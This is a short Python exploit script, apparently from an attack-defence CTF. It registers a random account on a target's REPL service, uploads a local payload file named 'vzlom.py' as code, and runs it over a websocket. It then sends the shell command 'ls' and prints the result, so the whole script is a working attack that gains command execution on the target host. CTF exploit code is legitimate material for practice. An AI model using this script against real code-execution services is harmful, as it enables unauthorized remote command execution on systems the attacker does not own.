from checklib import *
import requests
import sys
import websocket

HOST = sys.argv[1]
PORT = 7117


def main():
    url = f"http://{HOST}:{PORT}"
    ws_url = f"ws://{HOST}:{PORT}"
    username = rnd_username()
    password = rnd_password()
    session = get_initialized_session()
    token = session.post(
        f"{url}/api/register",
        json={
            "login": username,
            "password": password,
        },
    ).json()["message"]["token"]
    session.headers["Authorization"] = f"Bearer {token}"
    with open("vzlom.py") as f:
        repl_code = f.read()
    repl_id = session.put(f"{url}/api/repl", json={"code": repl_code}).json()[
        "message"
    ]["id"]
    ws = websocket.WebSocket()
    ws.connect(
        f"{ws_url}/api/run/{repl_id}",
        header={"Authorization": session.headers["Authorization"]},
    )
    ws.send_binary("ls\n")
    _, data = ws.recv_data()
    print(data)


if __name__ == "__main__":
    main()
